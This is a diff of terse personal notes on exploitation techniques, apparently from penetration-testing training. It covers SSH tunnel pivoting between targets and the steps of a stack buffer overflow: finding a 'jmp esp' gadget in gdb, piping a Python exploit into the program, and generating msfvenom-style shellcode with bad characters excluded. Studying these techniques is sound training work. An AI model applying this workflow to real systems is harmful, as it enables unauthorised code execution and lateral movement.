@@ -127,16 +127,27 @@ ssh -MS /tmp/t2 creds@127.0.0.1 -p 2323
 	authenticate to new target using previous tunnel
 repeat cycle
 
+--------------------------------------------------------------------------------------------------
 
+check test.py on linops for example script
 
-
-
-
-
-
-
-
-
+env - gdb func
+	allows us to change environmental variables in func
+	environmental version of gdb
+show env
+	shows env variables
+unset <varname>
+	unsets variable name
+crash program
+info proc map
+find /b 0xf7de2000 , 0xf7ffe000, 0xff, 0xe4
+	bottom of heap, top of heap, jump, esp
+run <<< $(python test.py)
+msfconsole
+use payload/linux/x86/exec
+set cmd whoami
+generate -b "\x00" -f python
+	copy and paste buf results into script
 
 
 
